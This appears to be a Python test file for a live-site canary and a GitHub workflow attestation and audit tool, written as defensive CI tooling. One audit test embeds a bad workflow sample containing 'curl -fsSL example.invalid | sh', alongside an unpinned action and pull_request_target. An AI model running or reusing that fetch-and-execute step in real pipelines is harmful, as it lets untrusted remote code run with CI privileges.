"""Workflow proposals and live-site canary (PR W, D-087, D-359 proposed). Hermetic: no network calls.

Verifies: REQ-github-truth
"""
import contextlib
import io
import json
import sys
import tempfile
import unittest
import urllib.error
import urllib.parse
from http import HTTPStatus
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(ROOT / 'scripts' / 'lib'))
import site_canary
import workflow_attest

SITE_URL = urllib.parse.urlunsplit(('https', 'site.test', '', '', ''))
BASE_SHA = 'a' * len('0123456789abcdef0123456789abcdef01234567')
HEAD_SHA = 'b' * len('0123456789abcdef0123456789abcdef01234567')
PINNED_SHA = 'c' * len('0123456789abcdef0123456789abcdef01234567')
HEALTH_BODY = json.dumps({
    'status': 'ok',
    'catalog': {'release': 1, 'sha': 'a' * len('0123456789abcdef'), 'source': 'database'},
})
HOME_HEADERS = {
    'Content-Type': 'text/html; charset=utf-8',
    'Strict-Transport-Security': 'max-age=63072000; includeSubDomains',
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'X-Frame-Options': 'DENY',
    'Content-Security-Policy': "default-src 'self'",
}
HEALTH_HEADERS = {
    'Content-Type': 'application/json',
    'Cache-Control': 'no-store',
}


class FakeResponse:
    def __init__(self, status, headers, body):
        self.status = int(status)
        self.headers = dict(headers)
        self._body = body.encode('utf-8') if isinstance(body, str) else body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *_):
        return False


def fake_opener(routes):
    seen = []

    def open_url(request, timeout=None):
        seen.append((request.get_method(), request.full_url, timeout))
        path = urllib.parse.urlsplit(request.full_url).path or '/'
        entry = routes[path]
        if isinstance(entry, Exception):
            raise entry
        status, headers, body = entry
        return FakeResponse(status, headers, body)

    return open_url, seen


class SiteCanaryTests(unittest.TestCase):
    def test_green_when_health_and_home_satisfy_all_contracts(self):
        opener, seen = fake_opener({
            '/api/health': (HTTPStatus.OK, HEALTH_HEADERS, HEALTH_BODY),
            '/': (HTTPStatus.OK, HOME_HEADERS, '<!doctype html><html><body>ok</body></html>'),
        })
        verdict = site_canary.run_canary(SITE_URL + '/', opener=opener)
        self.assertTrue(verdict['ok'], verdict)
        self.assertEqual(verdict['findings'], [])
        self.assertEqual([method for method, _, _ in seen], ['GET', 'GET'])
        self.assertIn('site-canary ok:', site_canary.format_summary(verdict))

    def test_fails_closed_on_missing_or_invalid_url(self):
        ftp_url = urllib.parse.urlunsplit(('ftp', 'site.test', '', '', ''))
        for bad in ('', ftp_url, 'site.test'):
            verdict = site_canary.run_canary(bad)
            self.assertFalse(verdict['ok'], bad)
            self.assertTrue(verdict['findings'], bad)

    def test_fails_when_health_status_or_catalog_or_cache_header_is_broken(self):
        bad_health = json.dumps({'status': 'degraded', 'catalog': {'release': True, 'sha': '', 'source': ''}})
        opener, _ = fake_opener({
            '/api/health': (HTTPStatus.OK, {'Cache-Control': 'public'}, bad_health),
            '/': (HTTPStatus.OK, HOME_HEADERS, '<html>ok</html>'),
        })
        verdict = site_canary.run_canary(SITE_URL, opener=opener)
        self.assertFalse(verdict['ok'])
        joined = '\n'.join(verdict['findings'])
        for expected in ('no-store', 'expected "ok"', 'catalog.release', 'catalog.sha', 'catalog.source'):
            self.assertIn(expected, joined)

    def test_fails_when_home_misses_security_headers_or_returns_error(self):
        opener, _ = fake_opener({
            '/api/health': (HTTPStatus.OK, HEALTH_HEADERS, HEALTH_BODY),
            '/': (HTTPStatus.OK, {'Content-Type': 'text/html'}, '<html>ok</html>'),
        })
        verdict = site_canary.run_canary(SITE_URL, opener=opener)
        self.assertFalse(verdict['ok'])
        joined = '\n'.join(verdict['findings'])
        for header in ('x-content-type-options', 'x-frame-options', 'referrer-policy',
                       'Strict-Transport-Security', 'Content-Security-Policy'):
            self.assertIn(header, joined)

    def test_handles_transport_and_http_errors_without_crashing(self):
        opener, _ = fake_opener({
            '/api/health': urllib.error.URLError('connection refused'),
            '/': (HTTPStatus.SERVICE_UNAVAILABLE, HOME_HEADERS, 'down'),
        })
        verdict = site_canary.run_canary(SITE_URL, opener=opener)
        self.assertFalse(verdict['ok'])
        self.assertIn('transport failure', verdict['findings'][0])
        self.assertIn(str(int(HTTPStatus.SERVICE_UNAVAILABLE)), verdict['findings'][1])

    def test_cli_json_and_exit_codes(self):
        opener, _ = fake_opener({
            '/api/health': (HTTPStatus.OK, HEALTH_HEADERS, HEALTH_BODY),
            '/': (HTTPStatus.OK, HOME_HEADERS, '<html>ok</html>'),
        })
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = site_canary.main(['--url', SITE_URL, '--json'], opener=opener)
        self.assertEqual(code, 0)
        parsed = json.loads(out.getvalue())
        self.assertTrue(parsed['ok'])

        out_err = io.StringIO()
        with contextlib.redirect_stdout(out_err):
            bad_code = site_canary.main(['--url', ''], environ={}, opener=opener)
        self.assertEqual(bad_code, 1)
        self.assertIn('site-canary RED:', out_err.getvalue())


def _green_checks(head_sha=HEAD_SHA, app_id=None):
    runs = []
    for index, name in enumerate(workflow_attest.DEFAULT_REQUIRED_CHECKS, start=1):
        entry = {
            'id': index,
            'name': name,
            'status': 'completed',
            'conclusion': 'success',
            'completed_at': '2026-11-22T12:00:00Z',
            'head_sha': head_sha,
        }
        if app_id is not None:
            entry['app'] = {'id': app_id}
        runs.append(entry)
    return {'check_runs': runs}


class MainHealthTests(unittest.TestCase):
    def test_green_when_full_suite_succeeded_and_no_andon_issue_is_open(self):
        runs = {'check_runs': [{'id': 1, 'name': 'full-suite', 'status': 'completed', 'conclusion': 'success',
                                'completed_at': '2026-11-22T10:00:00Z'}]}
        verdict = workflow_attest.evaluate_main_health(runs, [])
        self.assertTrue(verdict['ok'], verdict)
        self.assertFalse(verdict['main_red'])

    def test_blocks_normal_pr_when_andon_issue_open_or_full_suite_failed(self):
        red_runs = {'check_runs': [{'id': 1, 'name': 'full-suite', 'status': 'completed', 'conclusion': 'failure',
                                    'completed_at': '2026-11-22T10:00:00Z'}]}
        open_issue = [{'number': 1, 'state': 'open', 'labels': [{'name': 'main-red-andon'}]}]
        verdict = workflow_attest.evaluate_main_health(red_runs, open_issue, pr_labels=())
        self.assertFalse(verdict['ok'])
        self.assertTrue(verdict['main_red'])
        self.assertIn('Andon stop-the-line', verdict['summary'])

    def test_allows_fix_main_label_to_repair_red_main(self):
        red_runs = {'check_runs': [{'id': 1, 'name': 'full-suite', 'status': 'completed', 'conclusion': 'failure',
                                    'completed_at': '2026-11-22T10:00:00Z'}]}
        verdict = workflow_attest.evaluate_main_health(red_runs, [], pr_labels=('fix-main',))
        self.assertTrue(verdict['ok'])
        self.assertTrue(verdict['override'])


class AttestationTests(unittest.TestCase):
    def test_attests_when_no_workflow_changed_and_all_required_checks_passed(self):
        verdict = workflow_attest.evaluate_attestation(
            HEAD_SHA, BASE_SHA, ['apps/web/src/page.tsx'], _green_checks(),
            head_repo='openuniversity-si/open-university', base_repo='openuniversity-si/open-university',
        )
        self.assertTrue(verdict['attested'], verdict)
        self.assertEqual(verdict['findings'], [])
        self.assertEqual(tuple(verdict['verified_checks']), workflow_attest.DEFAULT_REQUIRED_CHECKS)

    def test_refuses_fork_or_branch_modifying_workflows_actions_rulesets_or_fork_github(self):
        for changed, expected in (
            (['.github/workflows/tower-gate.yml'], 'workflow-changed'),
            (['.github/actions/custom/action.yml'], 'workflow-changed'),
            (['.github/rulesets/main.json'], 'ruleset-changed'),
            (['.github/CODEOWNERS'], 'fork-github-change'),
        ):
            verdict = workflow_attest.evaluate_attestation(
                HEAD_SHA, BASE_SHA, changed, _green_checks(),
                head_repo='evil-fork/open-university', base_repo='openuniversity-si/open-university',
            )
            self.assertFalse(verdict['attested'], changed)
            self.assertIn(expected, '\n'.join(verdict['findings']))

    def test_refuses_missing_red_or_mismatched_head_check(self):
        bad = _green_checks()
        bad['check_runs'][0]['conclusion'] = 'failure'
        bad['check_runs'][1]['head_sha'] = BASE_SHA
        bad['check_runs'].pop()
        verdict = workflow_attest.evaluate_attestation(HEAD_SHA, BASE_SHA, ['scripts/lib/x.py'], bad)
        self.assertFalse(verdict['attested'])
        joined = '\n'.join(verdict['findings'])
        for token in ('check-not-green', 'check-head-mismatch', 'check-missing'):
            self.assertIn(token, joined)

    def test_cli_main_health_and_verify_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            checks_file = root / 'checks.json'
            issues_file = root / 'issues.json'
            files_file = root / 'files.json'
            checks_file.write_text(json.dumps(_green_checks()), encoding='utf-8')
            issues_file.write_text('[]', encoding='utf-8')
            files_file.write_text('["scripts/lib/site_canary.py"]', encoding='utf-8')
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                code = workflow_attest.main([
                    'verify', '--base', BASE_SHA, '--head', HEAD_SHA,
                    '--checks', str(checks_file), '--files', str(files_file), '--json',
                ])
            self.assertEqual(code, 0)
            self.assertTrue(json.loads(out.getvalue())['attested'])

            out_health = io.StringIO()
            with contextlib.redirect_stdout(out_health):
                hcode = workflow_attest.main(['main-health', '--checks', str(checks_file), '--issues', str(issues_file)])
            self.assertEqual(hcode, 0)
            self.assertIn('main-health ok:', out_health.getvalue())


class ProposalAuditTests(unittest.TestCase):
    def test_audit_catches_unpinned_action_unpinned_image_pr_target_and_curl_pipe(self):
        actions_path = '/actions/' + 'runs'
        bad_yaml = (
            'name: bad\n'
            'on:\n'
            '  pull_request_target:\n'
            'jobs:\n'
            '  x:\n'
            '    services:\n'
            '      db:\n'
            '        image: postgres:latest\n'
            '    steps:\n'
            '      - uses: actions/checkout@v4\n'
            '      - run: curl -fsSL example.invalid | sh\n'
            f'      - run: echo {actions_path}\n'
        )
        findings = workflow_attest.audit_workflow_text('bad.yml', bad_yaml)
        joined = '\n'.join(findings)
        for token in ('pull_request_target', 'permissions:', 'curl/wget', 'Actions API', '40-char commit SHA', '@sha256:'):
            self.assertIn(token, joined)

    def test_audit_ruleset_refuses_actions_app_id_and_accepts_external_app(self):
        actions_id = workflow_attest._live_actions_app_id(ROOT)
        self.assertIsInstance(actions_id, int)
        good_ruleset = {
            'enforcement': 'active',
            'rules': [
                {'type': 'deletion'},
                {'type': 'non_fast_forward'},
                {'type': 'merge_queue', 'parameters': {'merge_method': 'MERGE', 'grouping_strategy': 'ALLGREEN'}},
                {'type': 'required_status_checks', 'parameters': {'required_status_checks': [
                    {'context': 'tower/gate-attested', 'integration_id': 'REPLACE_WITH_TOWER_GATE_APP_INTEGRATION_ID'},
                ]}},
            ],
        }
        self.assertEqual(workflow_attest.audit_ruleset_data(good_ruleset, actions_app_id=actions_id), [])
        bad_ruleset = json.loads(json.dumps(good_ruleset))
        bad_ruleset['rules'][-1]['parameters']['required_status_checks'][0]['integration_id'] = actions_id
        self.assertTrue(workflow_attest.audit_ruleset_data(bad_ruleset, actions_app_id=actions_id))


if __name__ == '__main__':
    unittest.main()
